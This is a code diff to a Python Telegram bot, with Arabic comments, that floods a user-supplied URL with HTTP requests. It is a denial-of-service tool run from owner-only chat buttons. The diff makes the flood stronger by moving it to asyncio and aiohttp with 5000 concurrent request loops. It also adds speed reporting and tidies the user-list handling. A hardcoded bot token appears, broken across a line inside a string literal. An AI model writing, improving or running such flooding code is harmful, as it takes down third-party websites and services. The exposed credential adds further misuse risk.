@@ -7,6 +7,8 @@ from datetime import datetime
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 import logging
+import asyncio
+import aiohttp
 
 # إعداد السجلات مع مستوى تصحيح أكثر تفصيلاً
 logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -22,17 +24,7 @@ headers = {
                   '(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36')
 }
 
-# إنشاء جلسة واحدة للاستخدام المتكرر
-session = requests.Session()
-session.verify = False
-session.headers.update(headers)
-
-# متغيرات للتحكم في الهجوم
-bytes_transferred = 0
-lock = threading.Lock()
-stop_attack_event = threading.Event()
-
-# قراءة ربما قائمة معينة من المستخدمين
+# قائمة المالكين والمستخدمين
 Owner = ['6358035274']
 NormalUsers = []
 
@@ -41,39 +33,40 @@ def read_users():
         with open('owners.txt', 'r') as file:
             Owner.extend(file.read().splitlines())
     except FileNotFoundError:
-        logging.warning("لم يتم العثور على ملفات القوائم. سيتم استخدام القوائم الفارغة.")
+        logging.warning("لم يتم العثور على ملف مالكي البوت.")
 
     try:
         with open('normal_users.txt', 'r') as file:
             NormalUsers.extend(file.read().splitlines())
     except FileNotFoundError:
-        logging.warning("لم يتم العثور على ملفات القوائم. سيتم استخدام القوائم الفارغة.")
+        logging.warning("لم يتم العثور على ملف مستخدمي البوت.")
 
 read_users()
 
-def attack(url):
+# متغيرات للتحكم في الهجوم
+bytes_transferred = 0
+lock = threading.Lock()
+stop_attack_event = threading.Event()
+
+async def attack(url):
     """تنفيذ الهجوم عبر إرسال طلبات متتابعة"""
     global bytes_transferred
-    while not stop_attack_event.is_set():
-        try:
-            response = session.get(url)
-            with lock:
-                bytes_transferred += len(response.content)
-            logging.debug(f"تم إرسال الطلب إلى: {url}")
-        except requests.RequestException as e:
-            logging.error(f"حدث خطأ: {e}")
+    async with aiohttp.ClientSession() as session:
+        while not stop_attack_event.is_set():
+            try:
+                async with session.get(url) as response:
+                    data = await response.read()
+                    with lock:
+                        bytes_transferred += len(data)
+                    logging.debug(f"تم إرسال الطلب إلى: {url}")
+            except Exception as e:
+                logging.error(f"حدث خطأ: {e}")
 
-def start_attack(url):
+async def start_attack(url):
     """بدء الهجوم عبر عدة خيوط"""
     stop_attack_event.clear()
-    with ThreadPoolExecutor(max_workers=1000) as executor:
-        tasks = [executor.submit(attack, url) for _ in range(5000)]
-
-    for task in tasks:
-        try:
-            task.result()
-        except Exception as e:
-            logging.error(f"خطأ في تنفيذ الخيط: {e}")
+    tasks = [attack(url) for _ in range(5000)]
+    await asyncio.gather(*tasks)
 
 def stop_attack():
     """إيقاف الهجوم"""
@@ -91,7 +84,8 @@ def calculate_speed():
         logging.info(f"سرعة النقل: {speed:.2f} MB/s")
 
 # يجب تعيين التوكن بشكل مباشر
-TOKEN = '7317402155:AAHNB3hgGqKXiLqF1OhTYLG78HmTlm8dYI4'  # هنا يجب أن تضع توكن البوت الخاص بك
+TOKEN = '7317402155:AAHNB3hgGqKXiLqF1OhTYLG78HmTlm8dYI4
+'  # هنا يجب أن تضع توكن البوت الخاص بك
 if not TOKEN:
     logging.error("Bot token is not defined")
     raise Exception('Bot token is not defined')
@@ -107,16 +101,14 @@ def send_welcome(message):
     """التعامل مع رسالة البدء من المستخدم"""
     if is_owner(message.from_user.id):
         bot.reply_to(message, "مرحبًا بك في بوت ديابلو! استخدم القائمة أدناه لاختيار الأوامر.")
-    else:
-        bot.reply_to(message, "أنت لا تملك الصلاحيات الكافية لاستخدام هذا البوت.")
-
-    if is_owner(message.from_user.id):
         markup = InlineKeyboardMarkup()
         markup.add(InlineKeyboardButton("إضافة مستخدم", callback_data="add_user"))
         markup.add(InlineKeyboardButton("إزالة مستخدم", callback_data="remove_user"))
         markup.add(InlineKeyboardButton("بدء هجوم", callback_data="start_attack"))
         markup.add(InlineKeyboardButton("إيقاف الهجوم", callback_data="stop_attack"))
         bot.send_message(message.chat.id, "اختر أحد الأوامر:", reply_markup=markup)
+    else:
+        bot.reply_to(message, "أنت لا تملك الصلاحيات الكافية لاستخدام هذا البوت.")
 
 @bot.callback_query_handler(func=lambda call: is_owner(call.message.chat.id))
 def callback_query(call):
@@ -136,40 +128,45 @@ def callback_query(call):
 
 def process_add_user(message):
     """إضافة مستخدم إلى القائمة"""
-    user_id = message.text
-    if user_id:
-        with open('normal_users.txt', 'a') as file:
-            file.write(user_id + '\n')
-        NormalUsers.append(user_id)
-        bot.reply_to(message, "تمت إضافة المستخدم بنجاح.")
-        logging.info("تمت إضافة المستخدم بنجاح.")
+    user_id = message.text.strip()
+    if user_id and user_id not in NormalUsers:
+        try:
+            with open('normal_users.txt', 'a') as file:
+                file.write(user_id + '\n')
+            NormalUsers.append(user_id)
+            bot.reply_to(message, "تمت إضافة المستخدم بنجاح.")
+            logging.info("تمت إضافة المستخدم بنجاح.")
+        except Exception as e:
+            bot.reply_to(message, "حدث خطأ أثناء إضافة المستخدم.")
+            logging.error(f"خطأ أثناء إضافة المستخدم: {e}")
     else:
-        bot.reply_to(message, "لم يتم إدخال معرف المستخدم بشكل صحيح.")
-        logging.warning("فشل في إدخال معرف المستخدم بشكل صحيح.")
+        bot.reply_to(message, "المستخدم موجود بالفعل في القائمة أو معرف المستخدم غير صحيح.")
 
 def process_remove_user(message):
     """إزالة مستخدم من القائمة"""
-    user_id = message.text
+    user_id = message.text.strip()
     if user_id in NormalUsers:
-        with open('normal_users.txt', 'w') as file:
-            for user in NormalUsers:
-                if user != user_id:
+        try:
+            NormalUsers.remove(user_id)
+            with open('normal_users.txt', 'w') as file:
+                for user in NormalUsers:
                     file.write(user + '\n')
-        NormalUsers.remove(user_id)
-        bot.reply_to(message, "تمت إزالة المستخدم بنجاح.")
-        logging.info("تمت إزالة المستخدم بنجاح.")
+            bot.reply_to(message, "تمت إزالة المستخدم بنجاح.")
+            logging.info("تمت إزالة المستخدم بنجاح.")
+        except Exception as e:
+            bot.reply_to(message, "حدث خطأ أثناء إزالة المستخدم.")
+            logging.error(f"خطأ أثناء إزالة المستخدم: {e}")
     else:
-        bot.reply_to(message, "لم يتم إدخال معرف المستخدم بشكل صحيح.")
-        logging.warning("فشل في إدخال معرف المستخدم بشكل صحيح.")
+        bot.reply_to(message, "المستخدم غير موجود في القائمة أو معرف المستخدم غير صحيح.")
 
 def process_start_attack(message):
     """بدء هجوم على الهدف المحدد"""
-    url = message.text
+    url = message.text.strip()
     if url:
         bot.reply_to(message, f"بدء الهجوم على: {url}")
         speed_thread = threading.Thread(target=calculate_speed, daemon=True)
         speed_thread.start()
-        attack_thread = threading.Thread(target=start_attack, args=(url,))
+        attack_thread = threading.Thread(target=lambda: asyncio.run(start_attack(url)))
         attack_thread.start()
         markup = InlineKeyboardMarkup()
         markup.add(InlineKeyboardButton("إيقاف الهجوم", callback_data="stop_attack"))
